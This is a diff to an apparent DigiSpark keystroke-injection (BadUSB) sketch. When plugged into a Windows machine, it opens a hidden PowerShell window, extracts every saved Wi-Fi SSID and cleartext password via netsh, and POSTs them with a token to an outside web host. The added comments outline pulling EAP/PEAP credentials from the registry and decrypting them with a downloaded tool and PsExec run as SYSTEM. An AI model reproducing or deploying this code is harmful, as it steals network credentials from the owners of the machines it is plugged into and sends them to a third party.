@@ -20,6 +20,14 @@ void loop() {
   DigiKeyboard.print("powershell"); // write powershell 
   DigiKeyboard.sendKeyStroke(KEY_ENTER); // opens powershell
   delay(1000);
+  /// need to get EAP/PEAP Credentisals:
+  // get from register: [HKEY_CURRENT_USER\Software\Microsoft\Wlansvc\UserData\Profiles\{GUID}]
+  // "MSMUserData"=hex:  <=== get hex after "hex:"
+  // Dycrypt with http://www.outerhost.com/www/upload/8t4l1q2g7549/Crypt.zip in addition with PsExec tool https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
+  //convert the hex values list (right after the ""MSMUserData"=hex:" string) in a binary file.
+  // PsExec.exe -s -i cmd /k crypt.exe file.dat
+  // decode base 64 then decrypt again. 
+  
   DigiKeyboard.print("powershell -windowstyle hidden{$arr=$(netsh wlan show profile)-split': ';$res=@();for($i=10;$i-le$arr.Length-2;$i+=2){$ssid=$arr[$i];$pss=$(netsh wlan show profile name=$ssid key=clear|findstr \"Key Content\")-split': ';$postParams=@{token='1s5d47s98qwASDaw598wD51Dfg47m85C';data=$arr[$i]+\",\"+$pss[1]};Invoke-WebRequest -Uri https://5h-iot.com/wifi.php -Method POST -Body $postParams}}");// Get SSIDs
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   delay(1000);
